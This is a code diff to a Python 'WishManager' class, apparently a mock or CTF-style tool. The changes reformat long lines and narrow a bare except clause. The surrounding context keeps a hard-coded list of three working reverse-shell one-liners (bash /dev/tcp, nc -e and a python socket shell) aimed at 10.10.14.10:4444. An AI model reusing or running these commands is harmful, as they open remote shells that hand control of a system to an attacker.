@@ -62,7 +62,11 @@ class WishManager:
             commands = [
                 "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                 "nc -e /bin/bash 10.10.14.10 4444",
-                'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
+                'python3 -c \'import socket,subprocess,os;'
+                's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
+                's.connect(("10.10.14.10",4444));'
+                'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
+                'subprocess.call(["/bin/sh","-i"]);\'',
             ]
         else:
             # Default responses
@@ -171,7 +175,7 @@ class WishManager:
                 time.sleep(0.5)
                 if process.poll() is None:  # Process still running
                     process.kill()  # Force kill
-            except:
+            except Exception:
                 pass  # Ignore errors in termination
 
             # Update result
@@ -186,6 +190,14 @@ class WishManager:
     def format_wish_list_item(self, wish: Wish, index: int) -> str:
         """Format a wish for display in wishlist."""
         if wish.state == WishState.DONE and wish.finished_at:
-            return f"[{index}] wish: {wish.wish[:30]}{'...' if len(wish.wish) > 30 else ''}  (started at {wish.created_at} ; done at {wish.finished_at})"
+            return (
+                f"[{index}] wish: {wish.wish[:30]}"
+                f"{'...' if len(wish.wish) > 30 else ''}  "
+                f"(started at {wish.created_at} ; done at {wish.finished_at})"
+            )
         else:
-            return f"[{index}] wish: {wish.wish[:30]}{'...' if len(wish.wish) > 30 else ''}  (started at {wish.created_at} ; {wish.state})"
+            return (
+                f"[{index}] wish: {wish.wish[:30]}"
+                f"{'...' if len(wish.wish) > 30 else ''}  "
+                f"(started at {wish.created_at} ; {wish.state})"
+            )
